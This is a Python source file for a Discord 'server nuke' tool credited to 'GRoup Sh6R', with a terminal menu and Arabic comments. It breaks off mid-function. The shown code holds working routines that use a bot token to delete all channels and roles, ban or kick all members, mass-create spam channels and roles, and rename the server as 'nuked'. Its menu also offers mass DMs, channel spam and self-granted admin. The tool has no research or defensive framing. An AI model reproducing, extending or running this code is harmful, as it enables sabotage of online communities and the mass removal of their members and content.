import discord
import asyncio
import sys
import os
import random
from colorama import init, Fore, Back, Style
from datetime import datetime

init(autoreset=True)

# ========== تعريف الألوان ==========
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.BLUE
RS = Style.RESET_ALL
BR = Style.BRIGHT

# ========== ألوان خلفية ==========
BG_RED = Back.RED
BG_GREEN = Back.GREEN
BG_YELLOW = Back.YELLOW
BG_BLUE = Back.BLUE
BG_MAGENTA = Back.MAGENTA
BG_CYAN = Back.CYAN
BG_BLACK = Back.BLACK
BG_WHITE = Back.WHITE

# ========== البانر الرئيسي ==========
BANNER = f"""
{BR}{BG_BLACK}{R}╔═══════════════════════════════════════════════════════════════╗
{BR}{BG_BLACK}{R}║                                                                   ║
{BR}{BG_BLACK}{R}║  {BG_RED}{BR}{W}██████  ██████  ██████  ██    ██ ██████  {RS}{BG_BLACK}{R}   ║
{BR}{BG_BLACK}{R}║  {BG_RED}{BR}{W}██     ██  ██ ██  ██ ██    ██ ██  ██  {RS}{BG_BLACK}{R}   ║
{BR}{BG_BLACK}{R}║  {BG_RED}{BR}{W}████   ██████ ██████ ██    ██ ██████  {RS}{BG_BLACK}{R}   ║
{BR}{BG_BLACK}{R}║  {BG_RED}{BR}{W}██     ██  ██ ██  ██ ██    ██ ██  ██  {RS}{BG_BLACK}{R}   ║
{BR}{BG_BLACK}{R}║  {BG_RED}{BR}{W}██     ██  ██ ██  ██  ██████  ██  ██  {RS}{BG_BLACK}{R}   ║
{BR}{BG_BLACK}{R}║                                                                   ║
{BR}{BG_BLACK}{M}║            ███████ ██   ██  ██████  ██████  ██████              ║
{BR}{BG_BLACK}{M}║            ██      ██   ██ ██  ██ ██  ██ ██  ██              ║
{BR}{BG_BLACK}{M}║            ███████ ███████ ██████ ██████ ██████              ║
{BR}{BG_BLACK}{M}║                 ██ ██   ██ ██  ██ ██  ██ ██  ██              ║
{BR}{BG_BLACK}{M}║            ███████ ██   ██ ██  ██ ██  ██ ██  ██              ║
{BR}{BG_BLACK}{R}║                                                                   ║
{BR}{BG_BLACK}{R}╚═══════════════════════════════════════════════════════════════╝{RS}
"""

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    cls()
    print(f"{BR}{M}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║                                                               ║")
    print(f"║  {R}██████  ██████  ██████  ██    ██ ██████{M}   ║")
    print(f"║  {R}██     ██  ██ ██  ██ ██    ██ ██  ██{M}   ║")
    print(f"║  {R}████   ██████ ██████ ██    ██ ██████{M}   ║")
    print(f"║  {R}██     ██  ██ ██  ██ ██    ██ ██  ██{M}   ║")
    print(f"║  {R}██     ██  ██ ██  ██  ██████  ██  ██{M}   ║")
    print(f"║                                                               ║")
    print(f"║  {C}███████ ██   ██  ██████  ██████  ██████{M}              ║")
    print(f"║  {C}██      ██   ██ ██  ██ ██  ██ ██  ██{M}              ║")
    print(f"║  {C}███████ ███████ ██████ ██████ ██████{M}              ║")
    print(f"║  {C}     ██ ██   ██ ██  ██ ██  ██ ██  ██{M}              ║")
    print(f"║  {C}███████ ██   ██ ██  ██ ██  ██ ██  ██{M}              ║")
    print(f"║                                                               ║")
    print(f"║  {Y}───────────────────────────────────────────────────────{M}   ║")
    print(f"║  {BR}{G}         DISCORD SERVER NUKE TOOL v4.0{M}                    ║")
    print(f"║  {BR}{W}         ════════════════════════════{M}                    ║")
    print(f"║  {BR}{C}         Developer : @GRoup_Sh6R{M}                         ║")
    print(f"║  {Y}───────────────────────────────────────────────────────{M}   ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{RS}")
    print(f"{BR}{M}╔═══════════════════════════════════════════════════════════════╗")
    print(f"║  {W}[{G}✓{W}] TOOL LOADED SUCCESSFULLY          {W}[{R}!{W}] AUTHORIZED ONLY  ║")
    print(f"║  {W}[{G}✓{W}] READY FOR COMMANDS               {W}[{R}🔥{W}] GRoup Sh6R        ║")
    print(f"╚═══════════════════════════════════════════════════════════════╝{RS}")

def print_header(title):
    print(f"\n{BR}{M}╔═══ {title} {M}╗{RS}")
    print(f"{M}║{Y}═══════════════════════════════════════════════════════════════{M}║{RS}")

def print_footer():
    print(f"{M}║{Y}═══════════════════════════════════════════════════════════════{M}║{RS}")
    print(f"{M}╚═══════════════════════════════════════════════════════════════╝{RS}")

bot = None
token = ""
guild_id = 0

def print_menu():
    print_banner()
    print_header("MAIN MENU")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 01 {RS}  {R}⚡{RS} {W}NUKE FULL {Y}[Delete EveryThing + Ban + Create]{RS}  ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 02 {RS}  {R}🗑️{RS} {W}DELETE ALL CHANNELS                             ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 03 {RS}  {R}🎭{RS} {W}DELETE ALL ROLES                               ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 04 {RS}  {R}🔨{RS} {W}BAN ALL MEMBERS                                ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 05 {RS}  {R}👢{RS} {W}KICK ALL MEMBERS                               ")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 06 {RS}  {G}📝{RS} {W}CREATE CHANNELS                               ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 07 {RS}  {G}🎭{RS} {W}CREATE ROLES                                 ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 08 {RS}  {G}✏️{RS} {W}RENAME SERVER                                ")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {BG_YELLOW}{BR}{W} 09 {RS}  {Y}💬{RS} {W}MASS DM ALL MEMBERS                           ")
    print(f"{M}║{RS}   {BG_YELLOW}{BR}{W} 10 {RS}  {Y}🔊{RS} {W}SPAM ALL CHANNELS                            ")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {BG_MAGENTA}{BR}{W} 11 {RS}  {M}👑{RS} {W}GIVE ADMIN ROLE TO ME                       ")
    print(f"{M}║{RS}   {BG_BLUE}{BR}{W} 12 {RS}  {B}⚙️{RS} {W}SETTINGS                                     ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 00 {RS}  {R}❌{RS} {W}EXIT                                         ")
    print(f"{M}║{RS}                                                               ")
    print_footer()

def print_settings_menu():
    cls()
    print_banner()
    print_header("⚙️ SETTINGS")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {W}TOKEN    : {G}{token[:25]}...{RS if token else ''}{R}[NOT SET]{RS}         ")
    print(f"{M}║{RS}   {W}GUILD ID : {C}{guild_id}{RS if guild_id else ''}{R}[NOT SET]{RS}            ")
    print(f"{M}║{RS}                                                               ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 1 {RS}  {G}🔑{RS} {W}SET BOT TOKEN                              ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 2 {RS}  {G}🆔{RS} {W}SET GUILD ID                                ")
    print(f"{M}║{RS}   {BG_GREEN}{BR}{W} 3 {RS}  {G}🔗{RS} {W}CONNECT BOT                                ")
    print(f"{M}║{RS}   {BG_RED}{BR}{W} 0 {RS}  {R}⬅️{RS} {W}BACK TO MAIN                               ")
    print(f"{M}║{RS}                                                               ")
    print_footer()

async def nuke_all():
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"  {BR}{R}[✗] Server not found!{RS}")
        input(f"\n  {Y}Press Enter to continue...{RS}")
        return
    
    print(f"\n  {BR}{Y}[*] STARTING FULL NUKING...{RS}")
    total = 0
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"  {G}[✓] Deleted channel{RS}")
            total += 1
        except:
            pass
    
    for role in guild.roles:
        if role.name != "@everyone" and role.position < guild.me.top_role.position:
            try:
                await role.delete()
                print(f"  {G}[✓] Deleted role{RS}")
                total += 1
            except:
                pass
    
    for member in guild.members:
        if member != guild.me:
            try:
                await member.ban(reason="GRoup Sh6R NUKED")
                print(f"  {R}[✓] Banned: {member.name}{RS}")
                total += 1
            except:
                pass
    
    for i in range(50):
        try:
            await guild.create_text_channel(f"NUKE-GRoupSh6R-{i}")
            await guild.create_role(name=f"SH6R-{i}", colour=discord.Colour.random())
        except:
            pass
    
    try:
        await guild.edit(name="NUKED BY GRoup Sh6R")
        print(f"  {G}[✓] Server renamed{RS}")
    except:
        pass
    
    print(f"\n  {BR}{G}╔═══════════════════════════════════════════╗")
    print(f"  ║     ✅  NUKE COMPLETED SUCCESSFULLY!  ║")
    print(f"  ║     Total Actions: {total:<10}        ║")
    print(f"  ║     NUKED BY GRoup Sh6R               ║")
    print(f"  ╚═══════════════════════════════════════════╝{RS}")
    input(f"\n  {Y}Press Enter to continue...{RS}")

async def delete_all_channels():
    guild = bot.get_guild(guild_id)
    if not guild: return
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"  {G}[✓] Deleted: {channel.name}{RS}")
        except:
            pass
    input(f"\n  {Y}Press Enter...{RS}")

async def delete_all_roles():
    guild = bot.get_guild(guild_id)
    if not guild: return
    for role in guild.roles:
        if role.name != "@everyone" and role.position < guild.me.top_role.position:
            try:
                await role.delete()
                print(f"  {G}[✓] Deleted role: {role.name}{RS}")
            except:
                pass
    input(f"\n  {Y}Press Enter...{RS}")

async def ban_all():
    guild = bot.get_guild(guild_id)
    if not guild: return
    for member in guild.members:
        if member != guild.me:
            try:
                await member.ban(reason="BANNED BY GRoup Sh6R")
                print(f"  {R}[✓] Banned: {member.name}{RS}")
            except:
                pass
    input(f"\n  {Y}Press Enter...{RS}")

async def kick_all():
    guild = bot.get_guild(guild_id)
    if not guild: return
    for member in guild.members:
        if member != guild.me:
            try:
                await member.kick(reason="KICKED BY GRoup Sh6R")
                print(f"  {R}[✓] Kicked: {member.name}{RS}")
            except:
                pass
    input(f"\n  {Y}Press Enter...{RS}")

async def create_channels():
    guild = bot.get_guild(guild_id)
    if not guild: return
    print(f"\n  {C}═══════════════════════════{RS}")
    count = int(input(f"  {
